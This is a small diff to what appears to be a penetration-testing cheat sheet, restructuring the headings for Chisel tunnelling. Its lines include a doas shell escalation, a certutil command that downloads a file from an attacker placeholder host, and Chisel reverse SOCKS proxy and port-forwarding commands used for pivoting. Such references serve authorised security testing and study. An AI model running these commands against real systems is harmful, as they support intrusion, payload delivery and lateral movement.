@@ -350,13 +350,17 @@ doas -u <USERNAME> /bin/sh
 ```c
 certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 ```
-#### Chisel Socks Proxy
+
+#### Chisel
+
+##### Chisel Socks Proxy
 
 ```c
 ./chisel server -p 9002 -reverse -v
 ./chisel client <RHOST>:9002 R:1080:socks
 ```
-#### Chisel Port Forwarding
+
+##### Chisel Port Forwarding
 
 ```c
 ./chisel server -p 9002 -reverse -v
